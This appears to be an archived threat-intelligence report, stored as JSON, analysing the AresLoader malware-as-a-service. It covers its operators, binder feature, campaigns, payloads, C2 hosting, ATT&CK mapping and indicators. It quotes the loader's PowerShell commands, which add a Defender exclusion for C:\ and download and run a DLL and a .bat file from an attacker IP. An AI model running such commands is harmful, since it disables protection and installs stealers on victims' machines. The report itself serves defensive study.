# PRISM/ReportsJSON/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.json
{
    "id": "755c9b08-535a-4fe4-8667-07155d7a699a",
    "created_at": "2023-05-06T02:08:27.638775Z",
    "updated_at": "2024-11-22T02:03:44.099006Z",
    "deleted_at": null,
    "sha1_hash": "9fa48a68c3e92b81af1cc512caae958c6a25bdbf",
    "title": "2023-03-22 - New loader on the bloc - AresLoader",
    "authors": "",
    "file_creation_date": "2023-05-05T01:55:38Z",
    "file_modification_date": "2023-05-05T01:55:38Z",
    "file_size": 271233,
    "plain_text": "New loader on the bloc - AresLoader\nintel471.com/blog/new-loader-on-the-bloc-aresloader\n\nAresLoader is a new loader malware-as-a-service (MaaS) offered by threat actors with links\nto Russian hacktivism that was spotted recently in the wild. Most users are pushing a variety\nof information stealers with the service. The service offers a \u201cbinder\u201d tool that allows users to\nmasquerade their malware as legitimate software.\n\nWe would like to acknowledge Roberto Martinez and Taisiia Garkava for alerting us to their\nin-the-wild observations of AresLoader and sharing their observations with us.\n\nThe actors behind the loader\n\nIn late November 2022, a threat actor using the handle AiD Lock aka DarkBLUP announced\na new MaaS program called AresLoader on Telegram. The actor subsequently announced\nthe service on the popular underground forums RAMP and XSS. The actor claimed the\nmalware loader was written in the C programming language and allegedly is undetectable by\nWindows Defender antivirus software.\n\n1/10\n\nPreviously our cyber intelligence team had associated AiD Lock with PHANTOM DEV aka\nDead X Inject, and the DeadXInject Hack group, along with also offering the AiD Locker\nransomware-as-a-service (RaaS) program.\nAres Loader image5 Figure 1 - The AiD Locker Telegram channel July 28, 2022.\n\nThe hacktivism - cybercrime crossover continues\nThe group we associated AiD Lock with, PHANTOM DEV, engaged in hacktivist activities in\nmid-2022 and claimed affiliation with the Red Hackers Alliance Russia aka RHA, RHA R\npro-Russian hacktivist group. Evidence suggests multiple members of this group are either\nusers or administrators of the AresLoader MaaS. This trend is not surprising and something\nthat is being seen more frequently from hacktivist groups, who usually focus on distributed\ndenial-of-service (DDoS) attacks. However, the shift in tactics, techniques and procedures\n(TTPs) of these groups to align more closely with cybercriminals, while supporting nationstate political objectives, continues to be observed more frequently.\nAres Loader image4 Figure 2 - Red Hackers Alliance Telegram channel April 15, 2022.\n\nAresLoader - Malware-as-a-service breakdown\nThe AresLoader MaaS costs US $300 per month and includes five builds that allegedly are\n\u201cpacked manually.\u201d The AresLoader panel offers an optional binder service in which a\nlegitimate file is merged with the malicious loader.\nAres Loader image7 Figure 3 - The binder service upload page Dec. 27, 2022.\nThe idea is that the malicious payload can masquerade as a legitimate file, often an installer\nfor popular software.\n\nThe binder works by writing a stub launcher that will launch the original legitimate\nexecutable, then write a batch (.bat) file to disk and execute that .bat file with \u201ccmd.exe.\u201d\nAres Loader image6 Figure 4 - The process tree of the binder payload, which depicts two\nexecution paths \u2014 legitimate and malicious \u2014 March 13, 2023.\nThe .bat file contains three PowerShell commands that perform three tasks:\n\n1. Add \u201cC:\\\u201d to the Windows Defender exclusion paths via:\n\nAdd-MpPreference -ExclusionPath ('C:\\\\')\n2/10\n\n2. Fetch the malicious payload from a remote URL and execute it via:\nWGet (http://5.75.248[.]207/emsabp32.dll) -OutfilE $EnV:AlLuSErSpRoFiLe\\\\emsabp32.dll;\n\nStARt-proCEss $EnV:aLluseRspROFiLE\\\\emsabp32.dll\n\nIn this case, a Raccoon Stealer payload with the\n24de09bb454b0318af20ffcc21c6dd4ad5d6627cab7d7bfcb5c2278f63a2c3b7 SHA-256.\n\n3. The third PowerShell command fetches and launches a .bat file that uses rundll32.exe to\nexecute the target payload \u2014 emsabp32.dll in this case.\n\nWget (http[:]//5.75.248[.]207/rundll32.bat) -oUtFIle $env:aLluSerSPROfIle\\\\rundll32.bat;\nsTArT-proCESS $EnV:aLluSErsPRoFILE\\\\rundll32.bat\n\n.bat file - start rundll32.exe emsabp32.dll, [email protected]\n\nMalware behavior\nAresLoader has basic download and execute capabilities. Upon execution, it checks if it is\nrunning as an administrator. If not, it attempts to escalate its privileges using the\nShellExecuteA application programming interface (API) and \u201crunas\u201d command.\nAres Loader image10 Figure 5 - A privilege escalation attempt observed March 13, 2023.\nTo remain persistent, it sets a scheduled task and also adds a key to the\n\u201c\\HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\u201d registry key.\nAres Loader image2 Figure 6 - The image depicts the persistence mechanism \u2014\nscheduled task observed March 13, 2023.\nAres Loader image1 Figure 7 - The persistence mechanism \u2014 Run registry key observed\nMarch 13, 2023.\n\nDistribution methods\n\nCampaign one \u2014 SystemBC, Amadey direct install\n\n3/10\n\nIntel 471 first observed AresLoader in the wild Jan. 26, 2023. It was dropped by SystemBC\n(C2: 89.22.225[.]242) and later by the Amadey version 3.50 controller (C2:\n85.209.135[.]109), both times fetched from the same drop location \u2014 the\nhttp[:]//5.75.248[.]207/loader.exe link.\nAres Loader image9 Figure 8 - The download and execute commands received by Intel\n471 tracking systems captured March 13, 2023.\nIn addition to the AresLoader sample, the Laplas clipper was installed from the same IP\naddress that day. The threat actors first tried to install this payload directly following the\ninfection chain:\n\nSystemBC download and execute command a follow-up payload from the URL:\n\nhttp[:]//5.75.248[.]207/avicapn32.exe\n\nLaplas clipper (Golang variant) downloaded sample SHA-256 from the URL above:\n\n7cffcc27c8ab249e6e669274dd40d5ad138daa7f71548a5dfbb4b112db1053e2\n\nThey then shipped a second payload \u2014 a lightly obfuscated PowerShell script to download\nand fetch the above Laplas sample \u2014 from the URL\nhttp[:]//5.75.248[.]207/cmpbksrvc32.cmd.\n\nThe threat actor made a feeble attempt to bypass security measures by installing the same\npayload via a different method.\n\nWe tracked this AresLoader customer by monitoring the behavior of the SystemBC and\nAmadey botnets they control. We observed the actor operating the loader in this instance\nlikes to drop information-stealer malware, primarily Laplas, on victim machines and\nsubsequently cryptocurrency miner payloads.\n\nCampaign two \u2014 Using AresLoader binder service\n\n4/10\n\nA similar campaign to push AresLoader was discovered by malware researchers Roberto\nMartinez and Taisiia Garkava. In this case, several Raccoon Stealer samples were found\ndropping AresLoader. This AresLoader sample\n(40003d01db9c34da73a415792dba3a617fab65e91d2aae7bbbcd335af198a66b) dropped\nStealC and SystemBC payloads. The Raccoon Stealer payload was masquerading as an\ninstaller for a legitimate application called Revo Uninstaller Pro. The threat actor likely used\nthe binder service available through the AresLoader control panel.\nAres Loader image8 Figure 9 - The legitimate software installer window that is launched in\ntandem with the malicious payload.\nThe aforementioned .bat file that calls the payload with rundll32.exe sheds additional light on\nthe use of the AresLoader binder feature. The VirusTotal intelligence platform shows parent\npayloads of the .bat file that all masquerade as common freeware.\nAres Loader image3 Figure 10 - Some malicious files found on VirusTotal that probably\nwere created using the AresLoader binder service.\n\nPayloads\nNot many instances of AresLoader have been discovered in the wild at present, but the\nloader MaaS does appear to have a few \u201ccustomers.\u201d Payloads Intel 471 and other\nresearchers have observed thus far include:\n\nSystemBC \u2013 A back door and socket secure internet protocol (SOCKS) proxy tunnel.\nLumma Stealer \u2013 A popular stealer MaaS.\nStealC \u2013 A new stealer MaaS that offers a configurable targeting system.\nAurora Stealer \u2013 A stealer MaaS written in the Golang programming language.\nLaplas clipper \u2013 A cryptocurrency clipper written in .NET and Golang.\n\nHosting\nThe AresLoader command and control (C2) infrastructure has been hosted at virtual private\nserver (VPS) providers in Germany, the Netherlands and Russia.\n\n5/10\n\nIP address\n\nCountry\n\nASN\n\n162.55.187[.]234\n\nDE\n\nAS24940 Hetzner Online GmbH\n\n193.168.49[.]8\n\nRU\n\nAS198610 Beget LLC\n\n37.220.87[.]62\n\nNL\n\nAS204603 Partner LLC\n\n5.161.88[.]63\n\nUS\n\nAS213230 Hetzner Online GmbH\n\n5.75.240[.]155\n\nDE\n\nAS24940 Hetzner Online GmbH\n\n62.217.180[.]55\n\nRU\n\nAS198610 Beget LLC\n\n62.217.180[.]92\n\nRU\n\nAS198610 Beget LLC\n\n62.217.181[.]4\n\nRU\n\nAS198610 Beget LLC\n\nIntel 471 recommendations\nWe recommend defenders evaluate the following suggested measures for implementation in\ntheir environments:\n\nFlag scheduled tasks added via .bat or .cmd files.\nTurn on PowerShell logging.\nFlag changes to Defender exception list via \u201cAdd-MpPreference -ExclusionPath.\u201d\nEnforce evaluation of code signing for .exe files and MSI installers to detect tampering.\n\nMITRE ATT&CK\u00ae techniques\nThis report uses the MITRE ATT&CK\u00ae aka Adversarial Tactics, Techniques and Common\nKnowledge framework.\n6/10\n\nTechnique Title\n\nID\n\nUse\n\nCommand and scripting\ninterpreter: PowerShell\n\nT1059.001\n\nAresLoader uses a series of PowerShell scripts\nto load whichever malware it is loading for that\ncampaign.\n\nUser execution: Malicious\nfile\n\nT1204.002\n\nAresLoader depends on victims executing the\ndownloaded executable.\n\nT1053.005\n\nAresLoader uses a Scheduled Task to gain\npersistence.\n\nT1548.004\n\nAresLoader attempts to elevate privileges by\nexecuting itself with administrator privileges via\nShellExecuteA and \u201crunas.\u201d\n\nImpair defenses: Disable or\nmodify tools\n\nT1562.001\n\nAresLoader modifies Windows Defender by\nsetting an exclusion.\n\nMasquerading: Match\nlegitimate name or location\n\nT1036.005\n\nAresLoader masquerades as a legitimate\ninstaller for multiple software utilities by using a\nbinder to execute PowerShell commands.\n\nT1071.001\n\nAresLoader uses HTTP/HTTPS to\ncommunicate with its C2.\n\nExecution [TA0002]\n\nPersistence [TA0003]\nScheduled Task/Job\n\nPrivilege Escalation\n[TA0004]\nAbuse elevation control\nmechanism: Elevated\nexecution with prompt\nDefense Evasion\n[TA0005]\n\nCommand and Control\n[TA0011]\nApplication layer protocol:\nweb protocols\n\n7/10\n\nResource Development\n[TA0042]\nDedicated VPS\nInfrastructure\n\nT1584.003\n\nAresLoader MaaS operators rent VPSs to host\nthe AresLoader control panel and malicious\npayloads.\n\nIndicators\n\nIndicator value\n\nIndicator\ndescription\n\nhttp[:]//193[.]168[.]49[.]8\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//62[.]217[.]181[.]4\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//162[.]55[.]187[.]234\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//37[.]220[.]87[.]62\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//45[.]80[.]69[.]193\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//5[.]161[.]88[.]63\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//5[.]75[.]240[.]155\n\nAresLoader\ncontroller\nURL\n\n8/10\n\nhttp[:]//62[.]217[.]180[.]55\n\nAresLoader\ncontroller\nURL\n\nhttp[:]//62[.]217[.]180[.]92\n\nAresLoader\ncontroller\nURL\n\n169c70fc77814578aa83b3a666eb674c49e60ac6964b040de9b1e51c5966bf56\n\nAresLoader\nsample\n\n40003d01db9c34da73a415792dba3a617fab65e91d2aae7bbbcd335af198a66b\n\nAresLoader\nsample\n\n5c5829697e65e815e41670a142a90251297f8cff94282837c09443b9c1ebad26\n\nAresLoader\nsample\n\n7572b5b6b1f0ea8e857de568898cf97139c4e5237b835c61fea7d91a6f1155fb\n\nAresLoader\nsample\n\n7f53135e532f1799d5c77727e47bf8f25a0c1381e9684c9c9fb2d2d0cd0ab2e4\n\nAresLoader\nsample\n\n812d4d9446b7962344e389b9498d08dabce1c9113bb18f554633da7e5992c4a3\n\nAresLoader\nsample\n\n839cef8414117e4181cb87b998e90fb3dad81463f8c219966cb59147e2d7c2cb\n\nAresLoader\nsample\n\nb280e418cc13c8f1efe66c8c5f4b83e0a544ddbb9d0c460e24d279b93a22c5b3\n\nAresLoader\nsample\n\nbcec1f5dcdc03772d33bc63922603129c6eaf56358a7b5f4a4583c65766d71da\n\nAresLoader\nsample\n\nf46b9aeafe296ebbad909e927fad26a21b05fbbc68cb446299c224fd27ea7fb0\n\nAresLoader\nsample\n\n9/10\n\nhttp[:]//89[.]22[.]225[.]242[:]4193\n\nSystemBC\ncontroller\naddress\n\nhttp[:]//85[.]209[.]135[.]109/jg94cVd30f/index.php\n\nAmadey\ncontroller\nURL\n\nhttp[:]//5[.]75[.]248.207/loader[.]exe\n\nAresLoader\ndownload\nURL\n\nhttp[:]//5[.]75[.]248[.]207/avicapn32[.]exe\n\nLaplas\ndownload\nURL\n\nhttp[:]//5[.]75[.]248[.]207/cmpbksrvc32[.]cmd\n\nPowerShell\ndownload\nURL\n\n10/10",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-22 - New loader on the bloc - AresLoader.pdf"
    ],
    "report_names": [
        "2023-03-22 - New loader on the bloc - AresLoader.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1683338907638,
    "ts_updated_at": 1732241024099,
    "ts_creation_date": 1683251738000,
    "ts_modification_date": 1683251738000,
    "files": {
        "pdf": "https://archive.orkl.eu/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.pdf",
        "text": "https://archive.orkl.eu/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.txt",
        "img": "https://archive.orkl.eu/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.jpg"
    }
}